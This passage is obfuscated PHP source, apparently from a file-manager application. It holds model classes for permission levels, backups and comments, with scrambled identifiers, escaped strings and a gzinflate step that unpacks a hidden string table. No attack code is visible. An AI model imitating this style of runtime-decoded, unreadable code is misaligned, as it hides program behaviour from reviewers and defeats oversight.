"\123\171\163\x74\x65\155\56\163\157\165\x72\x63\x65\101\x75\164\x68\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\x65", "\141\165\164\150", "\154\141\x62\145\x6c", "\x64\151\x73\x70\154\141\x79", "\x73\171\x73\x74\145\155", "\163\157\x72\164"); public function initData() { $ØµåÙëŠ = $this->authDefault(); foreach ($ØµåÙëŠ as $ãåâê¥Ê) { $this->add($ãåâê¥Ê); } } public function findAuth($¸Ò›Ö‹Ş, $ï¿†ìÇß) { $®ƒóéÒÈ =& $_SERVER[Ï×Œõ”û]; $ş°Î˜âÎ = parent::listData(); foreach ($ş°Î˜âÎ as $ÇØ‘¸½‚) { $áçı½úŠ = intval($ÇØ‘¸½‚[$®ƒóéÒÈ[507]]); if ($áçı½úŠ <= 0 || $ÇØ‘¸½‚[$®ƒóéÒÈ[2157]] == 0) { continue; } if (($áçı½úŠ & $¸Ò›Ö‹Ş) != $¸Ò›Ö‹Ş) { continue; } if (($áçı½úŠ & $ï¿†ìÇß) != 0) { continue; } return $ÇØ‘¸½‚[$®ƒóéÒÈ[484]]; } return !1; } public function findAuthMax($ï”å÷ìª, $óÒª˜Æ’) { $ÌÊøõÆ§ =& $_SERVER[Ï×Œõ”û]; $ìÉÌŞó‰ = !1; $æÈ‘˜²– = parent::listData(); foreach ($æÈ‘˜²– as $¹‘ú±êÛ) { $´¡¶†Ì© = intval($¹‘ú±êÛ[$ÌÊøõÆ§[507]]); if ($´¡¶†Ì© <= 0 || $¹‘ú±êÛ[$ÌÊøõÆ§[2157]] == 0) { continue; } if (($´¡¶†Ì© & $ï”å÷ìª) != $ï”å÷ìª) { continue; } if (($´¡¶†Ì© & $óÒª˜Æ’) != 0) { continue; } if (!$ìÉÌŞó‰) { $ìÉÌŞó‰ = $¹‘ú±êÛ; continue; } if (intval($ìÉÌŞó‰[$ÌÊøõÆ§[507]]) < $´¡¶†Ì©) { $ìÉÌŞó‰ = $¹‘ú±êÛ; } } return $ìÉÌŞó‰ ? $ìÉÌŞó‰[$ÌÊøõÆ§[484]] : !1; } public function findAuthReadOnly() { $°µ‹Öî¾ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $’ÖºöÛÙ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($°µ‹Öî¾, $’ÖºöÛÙ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $™ŒÅ® =& $_SERVER[Ï×Œõ”û]; $¬ŒÜ¦¶ = parent::listData(); $ïæÂ¥çÀ = !1; foreach ($¬ŒÜ¦¶ as $Õ†•Ñ÷ª) { if ($Õ†•Ñ÷ª[$™ŒÅ®[507]] <= 0 || $Õ†•Ñ÷ª[$™ŒÅ®[2157]] == $™ŒÅ®[230]) { continue; } if (!$ïæÂ¥çÀ) { $ïæÂ¥çÀ = $Õ†•Ñ÷ª; continue; } if ($ïæÂ¥çÀ[$™ŒÅ®[507]] > $Õ†•Ñ÷ª[$™ŒÅ®[507]]) { $ïæÂ¥çÀ = $Õ†•Ñ÷ª; } } return $ïæÂ¥çÀ ? $ïæÂ¥çÀ[$™ŒÅ®[484]] : $™ŒÅ®[12]; } public function listData($ÊÂ¸–ëì = false, $Ç¼—æ¼ô = "\x73\x6f\162\164", $Ë¼Îñ™Ô = false) { return parent::listData($ÊÂ¸–ëì, $Ç¼—æ¼ô, $Ë¼Îñ™Ô); } public function update($Á˜ı¬á®, $œÇî—) { $ÈÇáî•¦ =& $_SERVER[Ï×Œõ”û]; $ä¹Î±È˜ = parent::listData($Á˜ı¬á®); $ñÎ… ¡” = $this->findByName($œÇî—[$ÈÇáî•¦[32]]); if (!$ä¹Î±È˜ || $ñÎ… ¡” && $ñÎ… ¡”[$ÈÇáî•¦[484]] != $ä¹Î±È˜[$ÈÇáî•¦[484]]) { return !1; } $this->filterAuth($œÇî—[$ÈÇáî•¦[507]]); return parent::update($Á˜ı¬á®, $œÇî—); } public function remove($¸¦€ûÛ) { $È«†Õ‰§ = parent::listData($¸¦€ûÛ); if (!$È«†Õ‰§ || $È«†Õ‰§[$_SERVER[Ï×Œõ”û][191]]) { return !1; } return parent::remove($¸¦€ûÛ); } public function add($àÊÓâ‚Ê = array()) { $‚ñâÚá =& $_SERVER[Ï×Œõ”û]; if ($this->findByName($àÊÓâ‚Ê[$‚ñâÚá[32]])) { return !1; } $Õ‹œÉœ = array($‚ñâÚá[32] => $‚ñâÚá[12], $‚ñâÚá[507] => 1, $‚ñâÚá[2158] => $‚ñâÚá[2147], $‚ñâÚá[2157] => 1, $‚ñâÚá[191] => 0, $‚ñâÚá[2159] => 0); $àÊÓâ‚Ê = array_merge($Õ‹œÉœ, $àÊÓâ‚Ê); $àÊÓâ‚Ê[$‚ñâÚá[2159]] = $this->getSort(); $this->filterAuth($àÊÓâ‚Ê[$‚ñâÚá[507]]); return parent::insert($àÊÓâ‚Ê); } private function getSort() { $ƒ–êœ’É =& $_SERVER[Ï×Œõ”û]; $„›Ü©ú² = parent::listData(); $åßƒŞò› = array_to_keyvalue($„›Ü©ú², $ƒ–êœ’É[12], $ƒ–êœ’É[2159]); return empty($åßƒŞò›) ? 0 : max($åßƒŞò›) + 1; } private function filterAuth(&$ƒÃ´±–ñ) { if (!$ƒÃ´±–ñ) { return; } $µ¨±”« = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $–²™ÀØò = array(); foreach ($µ¨±”« as $‰Œá¿çã) { if ($ƒÃ´±–ñ & $‰Œá¿çã) { $–²™ÀØò[] = $‰Œá¿çã; } } if (in_array(self::AUTH_ROOT, $–²™ÀØò)) { $ƒÃ´±–ñ = array_sum($µ¨±”«); return; } $„Åˆ™¥¥ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($–²™ÀØò as $‰Œá¿çã) { if (isset($„Åˆ™¥¥[$‰Œá¿çã])) { $–²™ÀØò = array_merge($–²™ÀØò, $„Åˆ™¥¥[$‰Œá¿çã]); } } $–²™ÀØò[] = self::AUTH_SHOW; $ƒÃ´±–ñ = array_sum(array_unique($–²™ÀØò)); } public function sort($œÜ€şŠÖ, $ëé¿®½ª) { return parent::update($œÜ€şŠÖ, $ëé¿®½ª); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\x62\141\x63\153\x75\x70\x4c\151\x73\x74"; public $field = array("\x69\x6f", "\x6e\x61\x6d\x65", "\163\164\x61\x74\165\x73", "\x63\157\x6e\164\145\x6e\164", "\155\141\156\x75\x61\154", "\162\145\x73\165\x6c\164", "\x74\x69\x6d\x65\x46\x72\157\x6d", "\x74\151\155\x65\x54\157"); public function config() { $Û™İÔ¯’ =& $_SERVER[Ï×Œõ”û]; Action($Û™İÔ¯’[2160])->taskInit(); $ßÛµ¾ƒ« = Model($Û™İÔ¯’[879])->get($Û™İÔ¯’[886]); $ßÛµ¾ƒ« = json_decode($ßÛµ¾ƒ«, !0); $ßÛµ¾ƒ« = is_array($ßÛµ¾ƒ«) ? $ßÛµ¾ƒ« : array(); $this->parseContent($ßÛµ¾ƒ«); unset($ßÛµ¾ƒ«[$Û™İÔ¯’[1900]]); Model($Û™İÔ¯’[1899])->cacheClear(); $ÉÈœ = $Û™İÔ¯’[2161]; $—’Åö¤½ = Model($Û™İÔ¯’[2162])->findByKey($Û™İÔ¯’[1518], $ÉÈœ); if (!$—’Åö¤½) { $—’Åö¤½ = array(); } if (isset($—’Åö¤½[$Û™İÔ¯’[206]])) { $—’Åö¤½[$Û™İÔ¯’[206]] = json_decode($—’Åö¤½[$Û™İÔ¯’[206]], !0); } if (isset($ßÛµ¾ƒ«[$Û™İÔ¯’[206]])) { $—’Åö¤½[$Û™İÔ¯’[206]][$Û™İÔ¯’[1903]] = $ßÛµ¾ƒ«[$Û™İÔ¯’[206]]; unset($ßÛµ¾ƒ«[$Û™İÔ¯’[206]]); } return array_merge($—’Åö¤½, $ßÛµ¾ƒ«); } public function listData($¢·’¬§ö = false, $‰¦ƒ¨â = "\155\157\144\151\146\171\x54\x69\x6d\x65", $õºƒÅ» = false) { $Ì±®áºÄ = parent::listData($¢·’¬§ö, $‰¦ƒ¨â, !0); if (!$Ì±®áºÄ) { return $Ì±®áºÄ; } if ($¢·’¬§ö) { $Ì±®áºÄ = array($Ì±®áºÄ); } foreach ($Ì±®áºÄ as &$Ä°ÕÛ) { $this->parseContent($Ä°ÕÛ); } return $¢·’¬§ö ? $Ì±®áºÄ[0] : $Ì±®áºÄ; } public function parseContent(&$ÍƒÑÆ«Õ) { $¨¨İÓî® =& $_SERVER[Ï×Œõ”û]; $áìÆš—Ö = _get($ÍƒÑÆ«Õ, $¨¨İÓî®[170], $¨¨İÓî®[91]); if (!in_array($áìÆš—Ö, array($¨¨İÓî®[885], $¨¨İÓî®[1259]))) { $ÍƒÑÆ«Õ[$¨¨İÓî®[170]] = $áìÆš—Ö == $¨¨İÓî®[91] ? $¨¨İÓî®[1259] : $¨¨İÓî®[885]; } } public function lastItem() { $À™¥½ªÊ = $this->listData(); return !empty($À™¥½ªÊ[0]) ? $À™¥½ªÊ[0] : null; } public function kill($û´ø»û¨) { $¸ìöëá =& $_SERVER[Ï×Œõ”û]; $‹µÛìÏû = $this->listData($û´ø»û¨); if (!$‹µÛìÏû || empty($‹µÛìÏû[$¸ìöëá[32]])) { return !0; } Task::kill($¸ìöëá[894]); Task::kill($¸ìöëá[915]); Task::kill($¸ìöëá[923]); $òÀùŞ¬¦ = $‹µÛìÏû[$¸ìöëá[32]]; $šş¬îğ˜ = TEMP_FILES . $¸ìöëá[889] . $òÀùŞ¬¦ . $¸ìöëá[8]; IO::remove($šş¬îğ˜, !1); return $this->remove($û´ø»û¨); } public function remove($Œõ€À°à) { $–çÊéÑ = $this->listData($Œõ€À°à); if (!$–çÊéÑ) { return !0; } return $this->backupRemove($–çÊéÑ); } private function backupRemove($£·£ü²Õ) { parent::remove($£·£ü²Õ[$_SERVER[Ï×Œõ”û][484]]); $‘Ëèòß¯ = $this->backupPath($£·£ü²Õ); IO::remove($‘Ëèòß¯, !1); return !0; } private function backupPath($£îÌ«Æ) { $áá£¢®Á =& $_SERVER[Ï×Œõ”û]; $¹‡€Ë½ = $£îÌ«Æ[$áá£¢®Á[32]]; $éÆñ«“´ = Model($áá£¢®Á[879])->get($áá£¢®Á[880]); $÷Û Ó¢ğ = substr(md5($áá£¢®Á[881] . $éÆñ«“´ . $¹‡€Ë½), 0, 8); return "\173\x69\x6f\72{$£îÌ«Æ[$áá£¢®Á[858]]}\x7d\57\x64\141\164\x61\142\x61\x73\x65\57\x62\141\143\x6b\x75\160\x2f" . $¹‡€Ë½ . $áá£¢®Á[11] . $÷Û Ó¢ğ; } public function start() { $˜Şñ»’î =& $_SERVER[Ï×Œõ”û]; if ($GLOBALS[$˜Şñ»’î[6]][$˜Şñ»’î[92]][$˜Şñ»’î[2163]] != $˜Şñ»’î[91]) { return !0; } $¾³›Ó“‚ = $this->config(); if (!$¾³›Ó“‚ || $¾³›Ó“‚[$˜Şñ»’î[1900]] != $˜Şñ»’î[91]) { return !1; } if ($¾³›Ó“‚[$˜Şñ»’î[170]] == $˜Şñ»’î[885]) { $Î±öÒĞÖ = Model($˜Şñ»’î[879])->get($˜Şñ»’î[1381]); if ($Î±öÒĞÖ == $˜Şñ»’î[1382]) { $¾³›Ó“‚[$˜Şñ»’î[170]] = $˜Şñ»’î[1259]; } } $˜‡«Ìõˆ = $this->process(); foreach ($˜‡«Ìõˆ as $ÙÌÂ”™Ö) { if ($ÙÌÂ”™Ö) { return Task::restart($ÙÌÂ”™Ö[$˜Şñ»’î[484]]); } } $ËëÏ‡–ï = new Backup(); $¡ŠÙ’–¶ = $ËëÏ‡–ï->db(); if ($¡ŠÙ’–¶) { $¡ŠÙ’–¶ = $ËëÏ‡–ï->dbFile(); if ($¡ŠÙ’–¶ && $¾³›Ó“‚[$˜Şñ»’î[170]] == $˜Şñ»’î[885]) { $¡ŠÙ’–¶ = $ËëÏ‡–ï->file(); } } Backup::set(array($˜Şñ»’î[856] => 1, $˜Şñ»’î[868] => time())); return !0; } public function process() { $Ù¾Âš¡º =& $_SERVER[Ï×Œõ”û]; $¬ÁĞËƒó = array($Ù¾Âš¡º[864] => Task::get($Ù¾Âš¡º[894]), $Ù¾Âš¡º[869] => Task::get($Ù¾Âš¡º[915]), $Ù¾Âš¡º[232] => Task::get($Ù¾Âš¡º[923])); $êê±¡Í¯ = !1; foreach ($¬ÁĞËƒó as &$Ñß¾Ìõ½) { if ($êê±¡Í¯) { $Ñß¾Ìõ½ = !1; continue; } if ($Ñß¾Ìõ½) { $£ì¿Âü = intval(_get($Ñß¾Ìõ½, $Ù¾Âš¡º[1934], 0)); if (time() - $£ì¿Âü > 7200) { Task::kill($Ñß¾Ìõ½[$Ù¾Âš¡º[484]]); $êê±¡Í¯ = !0; $Ñß¾Ìõ½ = !1; } } } return $¬ÁĞËƒó; } public function restore() { $¶˜ñ¯¢Ê =& $_SERVER[Ï×Œõ”û]; ActionCall($¶˜ñ¯¢Ê[2164], !0, 1); ActionCall($¶˜ñ¯¢Ê[2164], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\x65\156\164"; protected $tableMeta = array("\164\x61\142\154\145\x4e\141\155\x65" => "\143\x6f\x6d\155\145\x6e\164\137\155\x65\164\141", "\155\x65\x74\x61\x46\x69\x65\x6c\x64" => "\143\x6f\x6d\x6d\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¤Í•ı ) { $ä’ğÖÕĞ =& $_SERVER[Ï×Œõ”û]; if ($¤Í•ı [$ä’ğÖÕĞ[2165]]) { $Ü“˜Ô¶„ = $this->where(array($ä’ğÖÕĞ[2166] => $¤Í•ı [$ä’ğÖÕĞ[2165]]))->find(); if (!$Ü“˜Ô¶„ || $Ü“˜Ô¶„[$ä’ğÖÕĞ[190]] != $¤Í•ı [$ä’ğÖÕĞ[190]] || $Ü“˜Ô¶„[$ä’ğÖÕĞ[594]] != $¤Í•ı [$ä’ğÖÕĞ[594]]) { return !1; } $this->where(array($ä’ğÖÕĞ[2166] => $¤Í•ı [$ä’ğÖÕĞ[2165]]))->setAdd($ä’ğÖÕĞ[2167], 1); } $¤Í•ı [$ä’ğÖÕĞ[2168]] = 0; $¤Í•ı [$ä’ğÖÕĞ[2167]] = 0; $¤Í•ı [$ä’ğÖÕĞ[856]] = 1; return $this->add($¤Í•ı ); } public function commentCount($‡ºÜ…º, $¾Ù€£ÏÒ, $¦ÓÈÊâ÷ = false) { $à¯—î£Ä =& $_SERVER[Ï×Œõ”û]; if (!$‡ºÜ…º) { return array(); } if (is_string($‡ºÜ…º) || is_int($‡ºÜ…º)) { $‡ºÜ…º = array($‡ºÜ…º); } $°Èí¨û = array($à¯—î£Ä[594], $à¯—î£Ä[2169] => $à¯—î£Ä[590]); $¾£›û´¶ = array($à¯—î£Ä[594] => array($à¯—î£Ä[7], $‡ºÜ…º), $à¯—î£Ä[190] => $¾Ù€£ÏÒ); if ($¦ÓÈÊâ÷) { $¾£›û´¶[$à¯—î£Ä[1547]] = $¦ÓÈÊâ÷; } $¹ß·×œÁ = $this->field($°Èí¨û)->where($¾£›û´¶)->group($à¯—î£Ä[594])->select(); return array_to_keyvalue($¹ß·×œÁ, $à¯—î£Ä[594], $à¯—î£Ä[590]); } public function starTarget($±î’½‚É, $¦º¯¼÷¼) { $à­È‘ =& $_SERVER[Ï×Œõ”û]; $Õ¾ÔïÆ = $±î’½‚É + self::TYPE_STAR_OFFSET; $›—èœãÖ = array($à­È‘[1547] => USER_ID, $à­È‘[190] => $Õ¾ÔïÆ, $à­È‘[594] => $¦º¯¼÷¼); $öºÕºîµ = $this->where($›—èœãÖ)->find(); if ($öºÕºîµ) { return $this->where(array($à­È‘[484] => $öºÕºîµ[$à­È‘[484]]))->delete(); } $·ø€–åê = array($à­È‘[2165] => 0, $à­È‘[1547] => USER_ID, $à­È‘[856] => 1, $à­È‘[170] => $à­È‘[12], $à­È‘[190] => $Õ¾ÔïÆ, $à­È‘[594] => $¦º¯¼÷¼, $à­È‘[2168] => 0, $à­È‘[2167] => 0); return $this->add($·ø€–åê); } public function starTargetCount($æ‡ˆ£ˆÄ, $¼ÒæÌ’Ş) { $àÏ÷à˜ã =& $_SERVER[Ï×Œõ”û]; $•ëüóÂ£ = $¼ÒæÌ’Ş + self::TYPE_STAR_OFFSET; $Ü£æ±á = $this->commentCount($æ‡ˆ£ˆÄ, $•ëüóÂ£); $¿£ˆ¾êô = $this->commentCount($æ‡ˆ£ˆÄ, $•ëüóÂ£, USER_ID); return array($àÏ÷à˜ã[2170] => $Ü£æ±á, $àÏ÷à˜ã[2171] => $¿£ˆ¾êô); } public function starTargetUserList($’ı¥–Ø¥, $ö ©ñ) { $ºª®š¥Ó =& $_SERVER[Ï×Œõ”û]; $…Ó‚¯åİ = $’ı¥–Ø¥ + self::TYPE_STAR_OFFSET; $‘“Î¹Ã = array($ºª®š¥Ó[594] => $ö ©ñ, $ºª®š¥Ó[190] => $…Ó‚¯åİ); $¿ôÙàÄñ = $this->where($‘“Î¹Ã)->count(); $Ğˆİ½ˆ¾ = array($ºª®š¥Ó[334] => $¿ôÙàÄñ, $ºª®š¥Ó[2172] => array()); if (!$¿ôÙàÄñ) { return $Ğˆİ½ˆ¾; } $áéşÓ¿Ñ = $this->field($ºª®š¥Ó[1547])->where($‘“Î¹Ã)->limit(500)->select(); $áéşÓ¿Ñ = array_to_keyvalue($áéşÓ¿Ñ, $ºª®š¥Ó[12], $ºª®š¥Ó[1547]); $Ğˆİ½ˆ¾[$ºª®š¥Ó[2172]] = Model($ºª®š¥Ó[602])->userListInfo($áéşÓ¿Ñ); return $Ğˆİ½ˆ¾; } public function prasiseUserList($Ã÷éò–µ) { $õÒÒ£¦ =& $_SERVER[Ï×Œõ”û]; $Û¸Œà¬ß = array($õÒÒ£¦[2173] => $Ã÷éò–µ); $İâÙñµõ = $this->where($Û¸Œà¬ß)->find(); $Ê™Ó›ÛÓ = _get($İâÙñµõ, $õÒÒ£¦[2168], 0); $à’´ª³ = array($õÒÒ£¦[334] => $Ê™Ó›ÛÓ, $õÒÒ£¦[2172] => array()); if (!$Ê™Ó›ÛÓ) { return $à’´ª³; } $ÜÜÓıÜû = Model($õÒÒ£¦[2174])->field($õÒÒ£¦[1547])->where($Û¸Œà¬ß)->limit(500)->select(); $ÜÜÓıÜû = array_to_keyvalue($ÜÜÓıÜû, $õÒÒ£¦[12], $õÒÒ£¦[1547]); $à’´ª³[$õÒÒ£¦[2172]] = Model($õÒÒ£¦[602])->userListInfo($ÜÜÓıÜû); return $à’´ª³; } public function remove($Ú»öë) { $±ßĞàõŒ =& $_SERVER[Ï×Œõ”û]; $ßœ½¹ú = array($±ßĞàõŒ[2166] => $Ú»öë); $¡üûÊÆ× = $this->where($ßœ½¹ú)->find(); if ($¡üûÊÆ×[$±ßĞàõŒ[2165]]) { $this->where(array($±ßĞàõŒ[2166] => $¡üûÊÆ×[$±ßĞàõŒ[2165]]))->setAdd($±ßĞàõŒ[2167], -1); } return $this->removeArray($Ú»öë); } public function edit($˜şëøîä, $¢Œ³²Ğ) { $ü“ğ±­ =& $_SERVER[Ï×Œõ”û]; $˜æğÂ Ç = array($ü“ğ±­[2166] => $˜şëøîä); return $this->where($˜æğÂ Ç)->save(array($ü“ğ±­[2175] => $¢Œ³²Ğ)); } public function prasise($à–ÔÈÓ÷) { $ğ÷˜Úøû =& $_SERVER[Ï×Œõ”û]; $ê”•æ„ = Model($ğ÷˜Úøû[2176]); $¯ô¸‹ËÒ = array($ğ÷˜Úøû[2166] => $à–ÔÈÓ÷, $ğ÷˜Úøû[1921] => USER_ID); $íİ¶†³ = $ê”•æ„->where($¯ô¸‹ËÒ)->find(); if (!$íİ¶†³) { $ê”•æ„->add($¯ô¸‹ËÒ); $¢ß¼õÃÖ = $this->where(array($ğ÷˜Úøû[2166] => $à–ÔÈÓ÷))->setAdd($ğ÷˜Úøû[2168], 1); } else { $ê”•æ„->where($¯ô¸‹ËÒ)->delete(); $¢ß¼õÃÖ = $this->where(array($ğ÷˜Úøû[2166] => $à–ÔÈÓ÷))->setAdd($ğ÷˜Úøû[2168], -1); } return $¢ß¼õÃÖ; } public function targetInfo($³é·«“ı, $Ò‘‡¸œÕ) { $ÇÔö¯î« =& $_SERVER[Ï×Œõ”û]; $œî…†ï = array($ÇÔö¯î«[676] => $³é·«“ı, $ÇÔö¯î«[677] => $Ò‘‡¸œÕ); $ßŸ©‡™Ò = $this->where($œî…†ï)->count(); $¶„Í¶Óí = "\122\x49\107\x48\124\x20\x4a\117\x49\116\x20{$this->tablePrefix}\143\x6f\155\155\145\156\164\137\160\162\141\151\x73\145\40\x73\164\x61\x72\40\157\156\40\x63\157\x6d\x6d\x65\156\164\56\x63\x6f\155\x6d\x65\x6e\x74\111\x44\x20\x3d\40\163\164\141\x72\x2e\x63\157\155\x6d\145\x6e\x74\x49\104"; $˜ğƒ“‘Û = $this->alias($ÇÔö¯î«[431])->where($œî…†ï)->join($¶„Í¶Óí, $ÇÔö¯î«[2177])->count(); $¹Â¸›Ïƒ = array($ÇÔö¯î«[2178] => $ßŸ©‡™Ò, $ÇÔö¯î«[2179] => $˜ğƒ“‘Û); return $¹Â¸›Ïƒ; } public function listData($´ß×‘Áá) { $¶Â›Ö¢ =& $_SERVER[Ï×Œõ”û]; if (isset($´ß×‘Áá[$¶Â›Ö¢[2180]])) { if ($´ß×‘Áá[$¶Â›Ö¢[2180]]) { $´ß×‘Áá[$¶Â›Ö¢[2173]] = array($¶Â›Ö¢[1135], intval($´ß×‘Áá[$¶Â›Ö¢[2180]])); } unset($´ß×‘Áá[$¶Â›Ö¢[2180]]); } if (isset($´ß×‘Áá[$¶Â›Ö¢[2181]])) { if ($´ß×‘Áá[$¶Â›Ö¢[2181]]) { $´ß×‘Áá[$¶Â›Ö¢[2173]] = array($¶Â›Ö¢[1132], intval($´ß×‘Áá[$¶Â›Ö¢[2181]])); } unset($´ß×‘Áá[$¶Â›Ö¢[2181]]); } return $this->_listData($´ß×‘Áá); } private function _listData($şˆº—àæ) { $Š²Î·‘ =& $_SERVER[Ï×Œõ”û]; $—†Òƒç÷ = $this->where($şˆº—àæ)->_makeOrder()->selectPage(100); $this->_listAppendParent($—†Òƒç÷[$Š²Î·‘[447]]); $this->_listAppendUser($—†Òƒç÷[$Š²Î·‘[447]]); $this->_listAppendMeta($—†Òƒç÷[$Š²Î·‘[447]]); return $—†Òƒç÷; } private function _makeOrder() { $İ¸•×Î =& $_SERVER[Ï×Œõ”û]; $ÛÓü³ = array($İ¸•×Î[2168], $İ¸•×Î[2167], $İ¸•×Î[233]); $—ôô³Ø¥ = Input::get($İ¸•×Î[549], $İ¸•×Î[7], $İ¸•×Î[517], $ÛÓü³); $ÃÄì¿ñ÷ = Input::get($İ¸•×Î[550], $İ¸•×Î[7], $İ¸•×Î[1923], array($İ¸•×Î[2182], $İ¸•×Î[545])); $ÙÂ»Ğ = $—ôô³Ø¥ . $İ¸•×Î[53] . $ÃÄì¿ñ÷; return $this->order($ÙÂ»Ğ); } private function _listAppendParent(&$””¬Óé™) { $ôÌÄ´ƒü =& $_SERVER[Ï×Œõ”û]; $«šÙÂ¯ = array_unique(array_to_keyvalue($””¬Óé™, $ôÌÄ´ƒü[12], $ôÌÄ´ƒü[2165])); $«šÙÂ¯ = array_remove_value($«šÙÂ¯, $ôÌÄ´ƒü[230]); if (!$«šÙÂ¯) { return; } $Õµô†‚É = $this->where(array($ôÌÄ´ƒü[2166] => array($ôÌÄ´ƒü[7], $«šÙÂ¯)))->select(); $Õµô†‚É = array_to_keyvalue($Õµô†‚É, $ôÌÄ´ƒü[2173]); foreach ($””¬Óé™ as &$³†ˆçí§) { if (isset($Õµô†‚É[$³†ˆçí§[$ôÌÄ´ƒü[2165]]])) { $³†ˆçí§[$ôÌÄ´ƒü[2183]] = $Õµô†‚É[$³†ˆçí§[$ôÌÄ´ƒü[2165]]]; } } unset($³†ˆçí§); } private function _listAppendUser(&$Û¦¬÷ğñ) { $ñ×Š»Ü± =& $_SERVER[Ï×Œõ”û]; $ÚİĞ…àÁ = array_unique(array_to_keyvalue($Û¦¬÷ğñ, $ñ×Š»Ü±[12], $ñ×Š»Ü±[1547])); $ÚİĞ…àÁ = array_remove_value($ÚİĞ…àÁ, $ñ×Š»Ü±[230]); if (count($ÚİĞ…àÁ) == 0) { return; } foreach ($Û¦¬÷ğñ as $ªşÓÌø) { if (isset($ªşÓÌø[$ñ×Š»Ü±[2183]])) { $ÚİĞ…àÁ[] = $ªşÓÌø[$ñ×Š»Ü±[2183]][$ñ×Š»Ü±[1547]]; } } $»ÜÅ˜Â = Model($ñ×Š»Ü±[622])->userListInfo($ÚİĞ…àÁ); foreach ($Û¦¬÷ğñ as &$ªşÓÌø) { $ªşÓÌø[$ñ×Š»Ü±[690]] = $»ÜÅ˜Â[$ªşÓÌø[$ñ×Š»Ü±[1547]]]; if (isset($ªşÓÌø[$ñ×Š»Ü±[2183]])) { $ªşÓÌø[$ñ×Š»Ü±[2183]][$ñ×Š»Ü±[690]] = $»ÜÅ˜Â[$ªşÓÌø[$ñ×Š»Ü±[2183]][$ñ×Š»Ü±[1547]]]; } } unset($ªşÓÌø); } private function _listAppendMeta(&$úİºö) { $öœÌ°› =& $_SERVER[Ï×Œõ”û]; $ŞÇ¢åé­ = array_unique(array_to_keyvalue($úİºö, $öœÌ°›[12], $öœÌ°›[2173])); $ŞÇ¢åé­ = array_remove_value($ŞÇ¢åé­, $öœÌ°›[230]); if (!$ŞÇ¢åé­) { return; } foreach ($úİºö as $®¤¾Ë½²) { if (isset($®¤¾Ë½²[$öœÌ°›[2183]])) { $ŞÇ¢åé­[] = $®¤¾Ë½²[$öœÌ°›[2183]][$öœÌ°›[2173]]; } } $¶Î’¢„µ = $this->metaList($ŞÇ¢åé­); if (!$¶Î’¢„µ) { return !1; } foreach ($úİºö as &$®¤¾Ë½²) { $®¤¾Ë½²[$öœÌ°›[560]] = $¶Î’¢„µ[$®¤¾Ë½²[$öœÌ°›[2173]]]; if (isset($®¤¾Ë½²[$öœÌ°›[2183]])) { $®¤¾Ë½²[$öœÌ°›[2183]][$öœÌ°›[560]] = $¶Î’¢„µ[$®¤¾Ë½²[$öœÌ°›[2183]][$öœÌ°›[2173]]]; } } unset($®¤¾Ë½²); } private function metaList($Š”ıÙš¼) { $ôÍü¾…‡ =& $_SERVER[Ï×Œõ”û]; if (!$Š”ıÙš¼) { return array(); } $ÈßØÕ˜í = array($ôÍü¾…‡[2173] => array($ôÍü¾…‡[7], $Š”ıÙš¼)); $ö¸·Äñ = Model($ôÍü¾…‡[2184])->where($ÈßØÕ˜í)->select(); $ö¸·Äñ = array_to_keyvalue_group($ö¸·Äñ, $ôÍü¾…‡[2173]); foreach ($ö¸·Äñ as $ü£‚Ûí¥ => $ıá¬Ä°ï) { $ïãÀöÃ™ = array(); foreach ($ıá¬Ä°ï as $ÒéßšÜï) { $ïãÀöÃ™[$ÒéßšÜï[$ôÍü¾…‡[95]]] = $ÒéßšÜï[$ôÍü¾…‡[452]]; } $ö¸·Äñ[$ü£‚Ûí¥] = $ïãÀöÃ™; } return $ö¸·Äñ ? $ö¸·Äñ : array(); } public function removeTarget($÷”ÑÌ, $Î°îÓÍ›) { $ “˜îŸÁ =& $_SERVER[Ï×Œõ”û]; if (!$Î°îÓÍ›) { return !0; } $Î°îÓÍ› = is_array($Î°îÓÍ›) ? $Î°îÓÍ› : array($Î°îÓÍ›); $’ï†Åá¢ = array($ “˜îŸÁ[190] => $÷”ÑÌ, $ “˜îŸÁ[594] => array($ “˜îŸÁ[7], $Î°îÓÍ›)); $Õêšö‡ = $this->field($ “˜îŸÁ[2173])->where($’ï†Åá¢)->select(); $èîÓˆú– = array_to_keyvalue($Õêšö‡, $ “˜îŸÁ[12], $ “˜îŸÁ[2173]); return $this->removeArray($èîÓˆú–); } public function removeArray($äüİñ‡ç) { $Ø§µŒ§í =& $_SERVER[Ï×Œõ”û]; if (!$äüİñ‡ç) { return !0; } $äüİñ‡ç = is_array($äüİñ‡ç) ? $äüİñ‡ç : array($äüİñ‡ç); $¥ƒ†¦Ç = array($Ø§µŒ§í[2173] => array($Ø§µŒ§í[7], $äüİñ‡ç)); Model($Ø§µŒ§í[2176])->where($¥ƒ†¦Ç)->delete(); Model($Ø§µŒ§í[2185])->where($¥ƒ†¦Ç)->delete(); return $this->where($¥ƒ†¦Ç)->delete(); } } goto C»¢Úã‹ÍÎ; f›‹Äñõ–Ñ: $wvufxbidjz = $_SERVER[Ï×Œõ”û][707]; if (!$wvufxbidjz) { return; } $_SERVER[É‹íîÃÊ] = explode($_SERVER[Ï×Œõ”û][708], gzinflate(substr($_SERVER[Ï×Œõ”û][709], 10, -8))); goto fò®Ş¶É½; BËœê¨íé: class 